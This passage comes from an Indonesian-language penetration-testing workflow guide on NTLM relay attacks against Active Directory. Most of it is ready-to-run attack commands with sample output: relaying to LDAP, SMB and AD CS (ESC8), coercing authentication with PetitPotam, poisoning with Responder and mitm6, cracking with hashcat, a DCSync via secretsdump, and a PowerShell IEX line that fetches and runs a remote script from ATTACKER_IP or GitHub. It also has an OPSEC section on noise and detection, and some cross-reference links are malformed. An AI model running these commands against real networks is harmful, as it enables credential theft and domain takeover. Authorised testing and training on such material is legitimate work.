Target AD Object
 │
 └── msDS-KeyCredentialLink
          │
          ▼
    attacker-controlled
    key credential
```

Dalam environment/lab yang mendukung:

```bash
# Example shadow-credentials relay feature
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --shadow-credentials
```

Target-specific behavior dapat bervariasi berdasarkan version/configuration.

Untuk direct Certipy workflow:

```bash
# Consult the local Certipy shadow command syntax
certipy shadow -h
```

Hubungan:

```text
ntlmrelayx
   │
   └── LDAP relay
         │
         └── shadow credential modification

Certipy
   │
   └── direct shadow credential workflow
```

---

# 🌐 5. HTTP → LDAP

## 5.1 🧠 Kapan HTTP → LDAP Digunakan?

Contoh:

```text
Victim
 │
 └── WebDAV / HTTP authentication
          │
          ▼
       ATTACKER
          │
          │ relay
          ▼
         LDAP
```

Berguna ketika:

```text
SMB relay
    X
```

karena:

```text
SMB signing enabled
```

tetapi:

```text
HTTP authentication
    ✓
```

dapat dipicu.

---

# 5.1.1 🧩 WebDAV Coercion Concept

```text
Windows Client
      │
      │ WebDAV authentication
      ▼
Attacker HTTP listener
      │
      │ NTLM relay
      ▼
LDAP
```

---

# 5.2 🔍 Cek WebDAV

NetExec module support bergantung pada installation.

```bash
# Check WebDAV-related module if available
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -M webdav
```

Jika module tidak tersedia:

```bash
# Check available modules
netexec smb -L
```

---

# 5.2.1 🚀 Relay Listener

```bash
# Relay HTTP authentication to LDAP
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    --no-smb-server \
    --http-port 80
```

Concept:

```text
HTTP listener
      │
      ▼
NTLM authentication
      │
      ▼
LDAP relay
```

---

# 5.3 🧲 WebDAV + Coercion

Attack path:

```text
Victim
   │
   │ WebDAV request
   ▼
HTTP listener
   │
   │ NTLM
   ▼
ntlmrelayx
   │
   ▼
LDAP
```

> Ketersediaan WebDAV/coercion sangat bergantung pada environment Windows. Jangan menganggap semua client akan otomatis melakukan WebDAV authentication.

---

# 🏛️ 6. RELAY KE AD CS — ESC8

## 6.1 🪪 Konsep

ESC8 adalah:

```text
NTLM Relay
   +
AD CS Web Enrollment
```

Architecture:

```text
DC / Victim
    │
    │ NTLM authentication
    ▼
ATTACKER
    │
    │ relay
    ▼
AD CS Web Enrollment
    │
    ▼
Certificate
```

---

# 6.1.1 🔗 Hubungan dengan File 40

File 40:

```text
AD CS
 └── ESC8
```

File 41:

```text
NTLM Relay
 └── target = AD CS
```

Jadi:

```text
File 40 = WHY AD CS relay matters

File 41 = HOW NTLM relay primitive works
```

← [**File 40: AD CS Workflow**](https://chatgpt.com/40-adcs/[🔐 Workflow 40 — Active Directory Certificate Services (AD CS)](/docs/adcs))

---

# 6.2 🔎 Cek AD CS Web Enrollment

```bash
# Search for Web Enrollment/ESC8 indicators
certipy find \
    -u "$USERNAME@$DOMAIN" \
    -p "$PASSWORD" \
    -dc-ip "$DC_IP" \
    -stdout |
    grep -i -E "web enrollment|ESC8"
```

Manual:

```bash
# HTTP endpoint
curl -k -i \
    "http://$CA_IP/certsrv/"
```

HTTPS:

```bash
# HTTPS endpoint
curl -k -i \
    "https://$CA_IP/certsrv/"
```

---

# 6.2.1 📊 Output

Contoh:

```text
HTTP/1.1 401 Unauthorized
WWW-Authenticate: NTLM
```

Ini menunjukkan:

```text
Web Enrollment
    ✓ reachable
    ✓ authentication endpoint exists
```

Tetapi belum membuktikan:

```text
relay succeeds
```

---

# 6.3 🔁 AD CS Relay

Pada modern Impacket, `ntlmrelayx` memiliki AD CS attack handler yang membangun certificate request, termasuk SAN/UPN dan SID extension handling pada implementation saat ini.

Basic lab setup:

```bash
# CA hostname/IP
export CA_IP="10.10.10.30"

# Start AD CS relay handler
sudo ntlmrelayx.py \
    -t "http://$CA_IP" \
    --adcs \
    --template "DomainController"
```

Contoh:

```text
[*] Servers started
[*] HTTP server listening
[*] SMB server listening
[*] AD CS relay mode enabled
[*] Template: DomainController
```

---

# 6.3.1 🧲 Trigger Authentication

Gunakan coercion primitive pada lab:

```bash
# Example authenticated coercion
python3 PetitPotam.py \
    "$ATTACKER_IP" \
    "$DC_IP"
```

Atau:

```bash
# Alternative Coercer workflow
coercer coerce \
    -l "$ATTACKER_IP" \
    -t "$DC_IP" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -d "$DOMAIN"
```

---

# 6.3.2 ✅ Output Relay

Contoh realistis:

```text
[*] HTTPD(80): Received connection from 10.10.10.20
[*] HTTPD: Authenticating against http://10.10.10.30
[*] HTTPD: Received NTLM authentication
[*] Trying to relay credentials to AD CS
[*] Requesting certificate
[+] Certificate issued successfully
[*] Saving certificate to 'DC01.pfx'
```

---

# 6.4 🎫 Certificate → TGT

```bash
# Authenticate using the relayed certificate
certipy auth \
    -pfx "DC01.pfx" \
    -dc-ip "$DC_IP"
```

Possible output:

```text
[*] Using principal: dc01$@domain.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'dc01$.ccache'
```

Concept:

```text
NTLM relay
    │
    ▼
Certificate
    │
    ▼
PKINIT
    │
    ▼
TGT
```

---

# 6.4.1 ⚠️ Relay Certificate ≠ Automatic Domain Admin

Ini harus jelas.

```text
Relay successful
      ≠
TGT successful
      ≠
DCSync successful
```

Actual path:

```text
Relay
  │
  ▼
Certificate issued
  │
  ▼
Certificate mapping
  │
  ▼
PKINIT
  │
  ▼
TGT
  │
  ▼
Privileges of mapped identity
```

---

# 6.4.2 🧬 TGT → Privileged Operations

Jika certificate/TGT benar-benar merepresentasikan privileged identity dan lab mengizinkan operasi tersebut:

```bash
# Use certificate-derived Kerberos cache
export KRB5CCNAME="$PWD/dc01$.ccache"

# Verify
klist
```

Pada kondisi di mana identity tersebut mempunyai directory replication permissions:

```bash
# Example lab-only DRSUAPI credential extraction
python3 /opt/impacket/examples/secretsdump.py \
    -k \
    -no-pass \
    -dc-ip "$DC_IP" \
    "$DOMAIN/DC01\$@DC01.$DOMAIN"
```

---

# 🧠 7. LLMNR/NBT-NS POISONING

## 7.1 ⚔️ Poisoning vs Relay

### Poisoning

```text
Victim
 │
 │ Net-NTLMv2
 ▼
Responder
 │
 ▼
Capture
 │
 ▼
Crack
```

### Relay

```text
Victim
 │
 │ NTLM
 ▼
ntlmrelayx
 │
 ▼
Target
 │
 ▼
Authenticated
```

---

# 7.1.1 📊 Kapan Pilih Mana?

|Situasi|Pilihan|
|---|---|
|SMB signing disabled|Relay kandidat|
|SMB signing required|Jangan mengandalkan SMB relay|
|Strong password|Relay mungkin lebih menarik|
|No valid relay target|Capture + crack|
|Need password plaintext|Crack|
|Need immediate authorization|Relay|
|Need offline analysis|Capture|

---

# 7.2 🎣 Responder Full Capture Mode

Berbeda dengan relay mode.

### Full capture

```ini
SMB = On
HTTP = On
```

Kemudian:

```bash
# Capture Net-NTLMv2
sudo responder \
    -I tun0 \
    -rdwv
```

Responder akan menyimpan logs di installation-specific directory.

Cari:

```bash
# Typical log paths, depending on installation
ls /opt/Responder/logs/
ls /usr/share/responder/logs/
```

---

# 7.2.1 🔁 Jangan Campur Mode

```text
CAPTURE MODE
│
├── Responder SMB = On
├── Responder HTTP = On
└── ntlmrelayx not required

RELAY MODE
│
├── Responder SMB = Off
├── Responder HTTP = Off
└── ntlmrelayx = On
```

Ini salah satu golden rules paling penting.

---

# 7.3 🔓 Crack Net-NTLMv2

Hashcat mode umum untuk Net-NTLMv2:

```text
5600
```

Contoh:

```bash
# Crack captured Net-NTLMv2 responses
hashcat \
    -m 5600 \
    "/opt/Responder/logs/SMB-NTLMv2-SSP-*.txt" \
    "/usr/share/wordlists/rockyou.txt"
```

John:

```bash
# Crack using John the Ripper
john \
    "/opt/Responder/logs/SMB-NTLMv2-SSP-*.txt" \
    --wordlist="/usr/share/wordlists/rockyou.txt"
```

---

# 7.3.1 ✅ Setelah Password Didapat

```bash
# Validate the recovered credential
netexec smb "$TARGET_IP" \
    -u "$USERNAME" \
    -p "$PASSWORD"
```

Sekarang credential menjadi:

```text
plaintext password
```

berbeda dengan:

```text
Net-NTLMv2 response
```

---

# 🪟 8. INVEIGH

## 8.1 🧠 Kapan Menggunakan Inveigh?

Inveigh adalah alternative Windows-side untuk responder-like functionality.

Berguna ketika:

```text
ATTACKER
   │
   ▼
Windows foothold
   │
   ▼
Inveigh
```

Tidak perlu selalu kembali ke Parrot OS.

---

# 8.2 🧰 Panduan Lengkap Penggunaan Inveigh (Windows Foothold)

### Step 1 — Download & Preparation
Jika target Windows memiliki akses internet atau bisa berkomunikasi dengan web server attacker:

```powershell
# Bypass Execution Policy di PowerShell session saat ini
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# Option A: Download langsung dari GitHub jika ada internet
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1')

# Option B: Transfer dari Kali/Parrot via HTTP Server
# Di Kali/Parrot: python3 -m http.server 8080
# Di target Windows:
Invoke-WebRequest -Uri "http://ATTACKER_IP:8080/Inveigh.ps1" -OutFile Inveigh.ps1
Import-Module .\Inveigh.ps1
```

---

### Step 2 — Jalankan Inveigh Poisoner

```powershell
# Start LLMNR & NBNS spoofing dengan console & file logging aktif
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBNS Y -FileOutput Y
```

---

### Step 3 — Ekstrak Net-NTLMv2 Hash Hasil Capture

```powershell
# Query log real-time untuk melihat NTLMv2 hashes yang berhasil ditangkap
Get-InveighLog | Select-String "NTLMv2"
```

Output hash dalam format ini dapat langsung disalin dan dicrack menggunakan `hashcat -m 5600`.

---

### Step 4 — Stop Inveigh

```powershell
# Hentikan background listener Inveigh setelah selesai
Stop-Inveigh
```

---

# 🌐 9. MITM6

## 9.1 🧠 Konsep

Windows dapat menggunakan IPv6 secara prioritas pada banyak scenario.

Jika network tidak memiliki DHCPv6/DNS configuration yang aman:

```text
ATTACKER
   │
   │ rogue IPv6 DNS
   ▼
CLIENT
   │
   │ authentication
   ▼
ATTACKER
```

MITM6 mengeksploitasi trust pada IPv6/DNS configuration untuk memposisikan attacker sebagai DNS infrastructure pada environment tertentu.

---

# 9.1.1 ⚠️ Jangan Menganggap MITM6 = NTLM Relay

MITM6 sendiri adalah:

```text
IPv6/DNS poisoning
```

Sedangkan:

```text
ntlmrelayx
=
relay authentication
```

Attack chain:

```text
mitm6
  │
  ▼
DNS manipulation
  │
  ▼
authentication
  │
  ▼
ntlmrelayx
  │
  ▼
LDAP
```

---

# 9.2 📦 Install MITM6

```bash
# Install mitm6
python3 -m pip install mitm6
```

---

# 9.2.1 🚀 Start MITM6

```bash
# Start rogue IPv6 DNS responder for the lab domain
sudo mitm6 \
    -d "$DOMAIN"
```

### 🖥️ Contoh Output MITM6 yang Berhasil Aktif:

```text
Starting mitm6 using the following configuration:
Primary adapter: tun0
IPv6 address: fe80::1
DNS local search domain: domain.local
DNS allowlist: domain.local

[*] Sent spoofed reply for wpad.domain.local to fe80::abc:def
[*] Sent spoofed reply for domain.local to fe80::abc:def
```

---

# 9.2.2 🔁 ntlmrelayx (IPv6 Mode)

Untuk LDAP-based path:

```bash
# Relay incoming NTLM authentication to LDAP
sudo ntlmrelayx.py \
    -6 \
    -t "ldap://$DC_IP" \
    -smb2support
```

### 🖥️ Contoh Output `ntlmrelayx` saat Menerima Relay dari MITM6:

```text
[*] HTTPD(80): Connection from ::ffff:10.10.10.20
[*] HTTPD(80): Client requested path: /wpad.dat
[*] HTTPD(80): Serving WPAD authentication
[*] HTTPD(80): Authenticating against ldap://10.10.10.10 as DOMAIN\WORKSTATION$
[*] LDAP bind successful
```

> Exact relay target and LDAP security settings matter. Jangan menganggap `-6` otomatis bypass LDAP signing/channel binding.

---

# 9.2.3 🧠 Attack Flow

```text
IPv6 client
    │
    ▼
MITM6
    │
    │ rogue DNS
    ▼
Authentication request
    │
    ▼
ntlmrelayx
    │
    ▼
LDAP
```

---

# 🌳 10. DECISION TREE NTLM RELAY

```text
                 ┌───────────────────────┐
                 │    TARGET FOUND       │
                 └───────────┬───────────┘
                             │
                             ▼
                   Check SMB Signing
                             │
              ┌──────────────┴──────────────┐
              │                             │
              ▼                             ▼
        signing: False                signing: True
              │                             │
              ▼                             ▼
          SMB RELAY                    SMB relay blocked
              │                             │
        ┌─────┴─────┐                 ┌─────┼──────────────┐
        │           │                 │     │              │
        ▼           ▼                 ▼     ▼              ▼
      DC?        Member?           Poison  AD CS         MITM6
        │           │               +crack   │              │
        ▼           ▼                        ▼              ▼
      LDAP         SMB                      ESC8           IPv6
        │           │                        │              │
  ┌─────┼─────┐     │                        ▼              │
  │     │     │     ▼                      Cert            │
  ▼     ▼     ▼   SAM                       │              │
Escal. RBCD Shadow │                        ▼              │
User         Creds ▼                      PKINIT            │
  │             crack                        │              │
  ▼                │                         ▼              │
AD modify          PTH/Ticket             TGT               │
```

---

# 10.1 🔴 Signing Disabled

```text
signing: False
       │
       ▼
SMB Relay
       │
       ▼
Target
       │
 ┌─────┴──────┐
 ▼            ▼
DC           Member
 │            │
 ▼            ▼
LDAP         SMB
 │            │
 ├── ACL      ├── SAM
 ├── RBCD     ├── shares
 └── other    └── execution
```

---

# 10.2 🟢 Signing Enabled

```text
signing: True
      │
      ▼
No standard SMB relay
      │
      ├── Responder capture
      │       │
      │       ▼
      │     Crack
      │
      ├── Check AD CS
      │       │
      │       └── ESC8
      │
      └── MITM6
              │
              └── alternative auth path
```

---

# 10.3 🏛️ LDAP Relay Decision Tree

```text
LDAP target?
     │
    YES
     │
     ▼
LDAP signing enforced?
     │
 ┌───┴────┐
 YES      NO
  │        │
  ▼        ▼
STOP     relay candidate
           │
           ▼
Does relayed identity have useful rights?
           │
      ┌────┴────┐
     NO         YES
      │           │
      ▼           ▼
Capture /       ┌──┼─────────────┐
other path      │  │             │
                ▼  ▼             ▼
              ACL RBCD     Shadow Credentials
```

---

# 10.4 🔓 Setelah Mendapat Hash

```text
NT HASH obtained
       │
       ▼
Is target remotely accessible?
       │
   ┌───┴────┐
  YES       NO
   │         │
   ▼         ▼
PTH       Check alternative
   │       authentication
   ▼
SMB / WinRM / other
```

Jika yang didapat bukan NT hash:

```text
Net-NTLMv2
    │
    ├── crack
    │
    └── relay
```

---

# 🧯 11. COMMON ERRORS & TROUBLESHOOTING

|Error|Penyebab|Solusi|
|---|---|---|
|`STATUS_ACCESS_DENIED`|Relay authenticated tetapi authorization tidak cukup / target policy|Verifikasi privileges relayed identity|
|`SMB SessionError: STATUS_LOGON_FAILURE`|Target menolak authentication|Periksa target, NTLM availability, signing, SPN/context|
|Relay sukses tetapi tidak ada output|Authentication berhasil tetapi tidak ada actionable privilege|Cek identity dan target capabilities|
|`ntlmrelayx` langsung exit|Port conflict / argument invalid / missing dependency|Jalankan `--help`, cek port 80/445|
|Responder tidak capture|Interface salah / poisoning blocked|`ip addr`, pilih interface benar, cek traffic|
|`Connection refused`|Service target tidak listen|`nmap -p 80,389,445,636`|
|LDAP `strongerAuthRequired`|LDAP signing enforced|Standard unsigned relay blocked|
|`00000057: LdapErr: DSID...`|LDAP request invalid / parameter/attribute issue|Periksa LDAP operation dan target object|
|AD CS `HTTP 401 Unauthorized`|Endpoint requires authentication|401 bisa normal; cek NTLM negotiation|
|MITM6 tidak ada traffic|IPv6 not used / DHCPv6 protections / network topology|Inspect IPv6, DNS, interface|
|`The NTLM SSPI package generated an output token`|Authentication exchange state/message issue|Review source/target protocol compatibility|
|SMB signing bypass fails|Signing enforced / modern protections|Do not assume relay works; change target|
|Coercion tidak trigger|RPC blocked / service disabled / patch|Try another coercion primitive|
|`No entries`|Target file kosong / no target compatible|Inspect `targets.txt`|
|`[-] Relay failed`|Target rejects authentication|Check signing/channel binding/policy|
|Port 445 already in use|Responder SMB still enabled|Turn `SMB = Off`|
|Port 80 already in use|Responder HTTP still enabled|Turn `HTTP = Off`|
|`LDAP bind failed`|Signing or auth requirements|Use `CheckLDAPStatus.py`|
|`KRB_AP_ERR_SKEW` after certificate relay|Clock mismatch|Sync attacker and DC clocks|
|Certificate issued but auth fails|Mapping/policy issue|Inspect certificate identity/SID/EKU|
|Web enrollment reachable but relay fails|Relay protection / endpoint configuration|Analyze IIS/NTLM/CBT/mapping|
|Relay gives regular user|Authentication succeeded without admin authorization|Find a more privileged source identity|
|NTLMv2 hash will not work with `-hashes`|It is not an NT hash|Crack it or relay it|
|NetExec reports signing True|SMB signing required|Move away from SMB relay target|
|Responder captures but ntlmrelayx sees nothing|Responder is terminating authentication locally|Turn required Responder servers Off|
|LDAP modify denied|Relayed identity lacks directory rights|Analyze ACL/group membership|

---

# 11.1 🔴 STATUS_ACCESS_DENIED

```text
Relay
  │
  ▼
Authentication succeeds
  │
  ▼
Authorization check
  │
  ▼
ACCESS DENIED
```

Jangan otomatis menyimpulkan:

```text
relay broken
```

Bisa jadi:

```text
relay succeeded
```

tetapi:

```text
user privilege insufficient
```

---

# 11.2 ⚫ STATUS_LOGON_FAILURE

```text
STATUS_LOGON_FAILURE
```

berarti target gagal menerima authentication sebagai valid session.

Cek:

```text
1. username/domain
2. NTLM support
3. signing
4. target protocol
5. relay compatibility
```

---

# 11.3 🔌 Port Conflict

Check:

```bash
# Check which process owns SMB
sudo ss -ltnp | grep ':445'

# Check HTTP
sudo ss -ltnp | grep ':80'
```

Jika Responder:

```text
Responder owns 445
```

sementara:

```text
ntlmrelayx wants 445
```

maka salah satu harus berhenti.

---

# 11.4 🧾 LDAP `strongerAuthRequired`

Interpretation:

```text
LDAP signing is enforced
```

Utility Impacket memang menggunakan error `strongerAuthRequired` untuk mengidentifikasi enforcement tersebut.

---

# 11.5 🧲 Coercion Tidak Berhasil

Decision tree:

```text
Coercion failed
     │
     ├── Service running?
     │
     ├── RPC reachable?
     │
     ├── Authentication allowed?
     │
     ├── Firewall?
     │
     └── Patch level?
```

Kemudian coba primitive lain dalam lab:

```text
PetitPotam
PrinterBug
DFSCoerce
ShadowCoerce
Coercer
```

---

# 11.6 🔐 Certificate Issued tetapi PKINIT Gagal

```text
Certificate issued
       │
       ▼
PFX valid?
       │
       ▼
EKU?
       │
       ▼
Identity mapping?
       │
       ▼
SID extension?
       │
       ▼
KDC policy?
       │
       ▼
PKINIT success?
```

Ini sangat penting pada modern AD CS.

---

# 🕵️ 12. OPSEC & STEALTH

## 12.1 🔊 Noise Level

|Teknik|Noise Level|Detectable By|
|---|--:|---|
|LLMNR poisoning|🔴 HIGH|IDS, DNS/LLMNR monitoring, host logs|
|SMB relay|🟠 MEDIUM|SMB logs, network telemetry|
|LDAP relay|🟠 MEDIUM–HIGH|DC logs, directory auditing|
|MITM6|🟠 MEDIUM–HIGH|IPv6/DHCPv6 monitoring|
|Coercion|🔴 HIGH|RPC/security logs, service telemetry|
|AD CS relay|🟠 MEDIUM|CA/IIS/AD logs|
|Passive capture|🟡 LOW–MEDIUM|Network monitoring|
|Offline cracking|🟢 LOW network noise|Host/file artifacts|

---

# 12.1.1 📡 LLMNR Poisoning

Noise:

```text
HIGH
```

Karena:

```text
poisoned responses
DNS-like anomalies
repeated broadcasts
unexpected WPAD behavior
```

---

# 12.1.2 🔁 Relay

Relay dapat lebih quiet daripada broad poisoning jika:

```text
specific authentication
specific target
short execution window
```

Tetapi tetap meninggalkan:

```text
authentication logs
SMB/LDAP events
directory changes
CA issuance
```

---

# 12.2 🧹 Cleanup

Setelah relay:

```text
[ ] stop ntlmrelayx
[ ] stop responder
[ ] stop mitm6
[ ] restore Responder.conf
[ ] remove temporary users
[ ] remove temporary computer accounts
[ ] restore RBCD
[ ] restore shadow credentials
[ ] remove lab-generated certificates where applicable
[ ] document changes
```

---

# 12.2.1 🧾 Artifact yang Dapat Tertinggal

```text
NETWORK
 ├── authentication traffic
 ├── DNS anomalies
 └── IPv6 events

HOST
 ├── process execution
 └── temporary files

AD
 ├── group changes
 ├── ACL changes
 ├── RBCD attribute
 ├── KeyCredentialLink
 └── new computer account

AD CS
 ├── certificate request
 └── certificate issuance
```

---

# 🏆 13. GOLDEN RULES NTLM RELAY

## Rule 1 — 🔐 SELALU Cek SMB Signing

```bash
netexec smb 10.10.10.0/24
```

---

## Rule 2 — 🚨 Responder SMB=Off Saat Relay

```text
RELAY MODE
SMB = Off
HTTP = Off
```

---

## Rule 3 — 🧾 Net-NTLMv2 ≠ NTLM Hash

```text
Net-NTLMv2
   ├── crack
   └── relay

NT hash
   └── PTH
```

---

## Rule 4 — 🏛️ LDAP Relay Sangat Powerful

```text
SMB relay
   │
   ▼
host

LDAP relay
   │
   ▼
directory
```

---

## Rule 5 — 🧠 Authentication ≠ Authorization

```text
Relay successful
     ≠
Administrator
```

---

## Rule 6 — 🧲 Coercion Hanya Trigger

Coercion:

```text
forces authentication
```

bukan:

```text
privilege escalation itself
```

---

## Rule 7 — 🎯 Target Selection Menentukan Impact

```text
relay → random workstation
```

berbeda dengan:

```text
relay → DC LDAP
```

---

## Rule 8 — 🔄 Signing Enabled Bukan Akhir Dunia

Jika SMB relay blocked:

```text
check
├── LDAP
├── AD CS
├── MITM6
└── poisoning/cracking
```

---

## Rule 9 — 🪪 AD CS Relay = File 40 + File 41

```text
File 40
AD CS
  +
File 41
NTLM Relay
  =
ESC8
```

---

## Rule 10 — 🟣 RBCD Relay = File 39 + File 41

```text
File 39
RBCD
  +
File 41
LDAP relay
  =
RBCD via relay path
```

---

## Rule 11 — ⏰ Clock Sync untuk Kerberos

Setelah certificate relay:

```text
date
timedatectl
```

---

## Rule 12 — 🔎 Selalu Verify Source Identity

Tanyakan:

```text
"Siapa yang sedang direlay?"
```

Bukan hanya:

```text
"Relay berhasil?"
```

---

# ⚡ 14. CHEATSHEET NTLM RELAY

## 14.1 🔎 RECON

```bash
# [1] Check SMB signing
netexec smb 10.10.10.0/24
```

```bash
# [2] Check LDAP signing/channel binding
python3 /opt/impacket/examples/CheckLDAPStatus.py \
    -dc-ip "$DC_IP" \
    -domain "$DOMAIN"
```

---

# 14.2 🔁 SMB RELAY SETUP

```bash
# [1] Generate SMB relay target list
netexec smb 10.10.10.0/24 \
    --gen-relay-list "targets.txt"
```

```bash
# [2] Start ntlmrelayx
sudo ntlmrelayx.py \
    -tf "targets.txt" \
    -smb2support \
    -l "loot"
```

```bash
# [3] Start Responder in poisoning mode
# IMPORTANT: SMB/HTTP must be Off in Responder.conf
sudo responder \
    -I tun0 \
    -rdwv
```

---

# 14.3 🏛️ LDAP RELAY SETUP

```bash
# [1] Start LDAP relay
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support
```

```bash
# [2] LDAP relay with a controlled lab privilege action
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --escalate-user "$USERNAME"
```

```bash
# [3] LDAP relay for RBCD-related operation
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --delegate-access
```

---

# 14.4 🪪 AD CS RELAY

```bash
# [1] Verify AD CS web enrollment
curl -k -i \
    "http://$CA_IP/certsrv/"
```

```bash
# [2] Start AD CS relay
sudo ntlmrelayx.py \
    -t "http://$CA_IP" \
    --adcs \
    --template "DomainController"
```

```bash
# [3] Authenticate using issued certificate
certipy auth \
    -pfx "DC01.pfx" \
    -dc-ip "$DC_IP"
```

---

# 14.5 🔓 CAPTURE + CRACK

```bash
# [1] Start Responder capture mode
sudo responder \
    -I tun0 \
    -rdwv
```

```bash
# [2] Crack Net-NTLMv2
hashcat \
    -m 5600 \
    "/opt/Responder/logs/SMB-NTLMv2-SSP-*.txt" \
    "/usr/share/wordlists/rockyou.txt"
```

---

# 14.6 🌐 MITM6

```bash
# [1] Start rogue IPv6 DNS behavior
sudo mitm6 \
    -d "$DOMAIN"
```

```bash
# [2] Relay IPv6-triggered authentication to LDAP
sudo ntlmrelayx.py \
    -6 \
    -t "ldap://$DC_IP" \
    -smb2support
```

---

# 🧠 15. CROSS-WORKFLOW

## ← File 40 — AD CS

```text
AD CS
 │
 └── ESC8
       │
       └── NTLM Relay → Web Enrollment
```

File 41 membuat primitive relay lebih jelas:

```text
Source Authentication
       │
       ▼
NTLM Relay
       │
       ▼
AD CS
```

← [**File 40: AD CS Workflow**](https://chatgpt.com/40-adcs/[🔐 Workflow 40 — Active Directory Certificate Services (AD CS)](/docs/adcs))

---

## ← File 36 — BloodHound

BloodHound membantu menemukan:

```text
who controls what
```

Dalam relay:

```text
BloodHound
    │
    ├── identify DC
    ├── identify high-value computer
    ├── identify ACL
    └── identify possible RBCD target
```

Jadi:

```text
Recon
  │
  ▼
BloodHound
  │
  ▼
Relay Target Selection
```

← [**File 36: BloodHound**](https://chatgpt.com/36-bloodhound/[🩸 36 — Active Directory BloodHound Workflow](/docs/ad-bloodhound))

---

## → File 42 — Lateral Movement

Setelah relay menghasilkan:

```text
hash
ticket
session
shell
certificate
```

masuk ke:

```text
Lateral Movement
```

Contoh:

```text
Relay
 │
 ├── NT hash
 ├── Kerberos ticket
 └── authenticated session
       │
       ▼
   Lateral Movement
```

→ [**File 42: Lateral Movement**](https://chatgpt.com/42-lateral-movement/<a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>)

---

## → File 43 — Domain Persistence

Setelah memperoleh high privilege:

```text
Relay
  │
  ▼
Privileged Access
  │
  ▼
Persistence
```

Contoh persistence-relevant artifacts:

```text
certificates
group membership
delegation
ACL
shadow credentials
```

→ [**File 43: Domain Persistence**](https://chatgpt.com/43-domain-persistence/<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>)

---

# 🧠 16. FINAL MENTAL MODEL

Jangan menghafal:

```text
Responder command
ntlmrelayx command
PetitPotam command
MITM6 command
```

secara terpisah.

Hafalkan:

```text
              AUTHENTICATION
                    │
                    ▼
              Can I receive it?
                    │
                    ▼
               NTLM MATERIAL
                    │
             ┌──────┴──────┐
             │             │
             ▼             ▼
           CAPTURE        RELAY
             │             │
             ▼             ▼
        Net-NTLMv2      TARGET SERVICE
             │             │
             ▼             ├── SMB
           CRACK           ├── LDAP
             │             ├── AD CS
             ▼             └── other
        PASSWORD
```

---

# 🔐 16.1 Credential Mental Model

```text
PASSWORD
    │
    ▼
NT HASH
    │
    ├── PTH
    │
    └── NTLM authentication
            │
            ▼
       Net-NTLMv2
            │
       ┌────┴─────┐
       ▼          ▼
     CRACK       RELAY
```

---

# 🎯 16.2 Target Mental Model

```text
                RELAY
                  │
       ┌──────────┼──────────┐
       │          │          │
       ▼          ▼          ▼
      SMB        LDAP       AD CS
       │          │          │
       ▼          ▼          ▼
      SAM       AD Obj      PFX
       │          │          │
       ▼          │          ▼
      PTH         │         PKINIT
                  │          │
                  ▼          ▼
                 RBCD        TGT
```

---

# 🧠 16.3 Responder Mental Model

```text
                Responder
                    │
           ┌────────┴────────┐
           │                 │
           ▼                 ▼
      CAPTURE MODE       RELAY MODE
           │                 │
    SMB = On             SMB = Off
    HTTP = On            HTTP = Off
           │                 │
           ▼                 ▼
     Net-NTLMv2          ntlmrelayx
           │                 │
           ▼                 ▼
         CRACK             TARGET
```

**Ingat:**

```text
Responder ≠ ntlmrelayx
```

---

# 🧠 16.4 LDAP Relay Mental Model

```text
              NTLM AUTH
                  │
                  ▼
              ntlmrelayx
                  │
                  ▼
                 LDAP
                  │
        ┌─────────┼─────────┐
        │         │         │
        ▼         ▼         ▼
       ACL       RBCD     Shadow
        │         │        Creds
        │         │         │
        ▼         ▼         ▼
     Object    Computer    Key
    Control    Object     Credential
```

---

# 🧠 16.5 ESC8 Mental Model

```text
            COERCION
               │
               ▼
          DC authenticates
               │
               ▼
             NTLM
               │
               ▼
          ntlmrelayx
               │
               ▼
         AD CS Web Enrollment
               │
               ▼
          Certificate
               │
               ▼
             PKINIT
               │
               ▼
              TGT
```

---

# 🧠 16.6 One-Line Rules

```text
SMB signing False
    → SMB relay candidate

SMB signing True
    → Standard SMB relay blocked

LDAP strongerAuthRequired
    → LDAP signing enforced

Net-NTLMv2
    → Crack or Relay

NT hash
    → Pass-the-Hash candidate

Responder SMB On
    → Capture mode

Responder SMB Off
    → Relay-friendly mode

ESC8
    → NTLM Relay → AD CS

RBCD
    → LDAP object control + delegation

Relay success
    ≠
Administrator
```

---

# ✅ 17. NTLM RELAY CHECKLIST

```text
[ ] Identify domain/DC
[ ] Enumerate SMB
[ ] Check SMB signing
[ ] Enumerate LDAP
[ ] Check LDAP signing
[ ] Check LDAPS/channel binding
[ ] Identify high-value relay targets
[ ] Determine source authentication possibility
[ ] Decide poisoning vs coercion
[ ] Configure Responder mode correctly
[ ] SMB = Off when ntlmrelayx needs TCP/445
[ ] HTTP = Off when ntlmrelayx needs TCP/80
[ ] Start ntlmrelayx
[ ] Trigger authentication
[ ] Identify relayed account
[ ] Verify target authentication
[ ] Verify authorization
[ ] Decide:
      [ ] SMB action
      [ ] LDAP action
      [ ] AD CS
      [ ] Crack
[ ] Save relevant evidence
[ ] Cleanup temporary changes
```

---

# 🏁 18. ONE-MINUTE SUMMARY

```text
NTLM
 │
 ├── challenge-response
 │
 └── password is not sent plaintext
          │
          ▼
     NTLMv2 authentication
          │
          ▼
      Net-NTLMv2
          │
    ┌─────┴─────┐
    ▼           ▼
  CRACK        RELAY
    │           │
    ▼           ▼
PASSWORD      TARGET
                │
       ┌────────┼─────────┐
       ▼        ▼         ▼
      SMB      LDAP      AD CS
       │        │         │
       ▼        ▼         ▼
      SAM      ACL       CERT
       │        │         │
       ▼        ▼         ▼
      PTH      RBCD     PKINIT
                         │
                         ▼
                        TGT
```

---

# 🎯 FINAL GOLDEN MENTAL MODEL

Ketika menemukan NTLM, jangan langsung berpikir:

```text
"crack hash"
```

